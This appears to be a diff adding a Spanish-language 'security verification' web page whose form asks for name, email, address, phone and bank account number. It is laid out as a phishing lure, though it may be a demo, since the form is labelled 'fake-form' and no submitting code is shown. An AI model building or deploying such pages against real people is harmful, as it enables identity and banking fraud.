@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificación de Seguridad</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <h1>Verificación de Seguridad</h1>
+    <p>Por favor, verifica tus datos para continuar.</p>
+    <form id="fake-form">
+      <input type="text" placeholder="Nombre y apellidos" required>
+      <input type="email" placeholder="Correo electrónico" required>
+      <input type="text" placeholder="Dirección completa" required>
+      <input type="tel" placeholder="Número de teléfono" required>
+      <input type="text" placeholder="Número de cuenta bancaria" required>
+      <button type="submit">Enviar</button>
+    </form>
+    <div id="loading" class="hidden">
+      <p>Procesando tu información...</p>
+    </div>
+  </div>
+  <script src="script.js"></script>
+</body>
+</html>
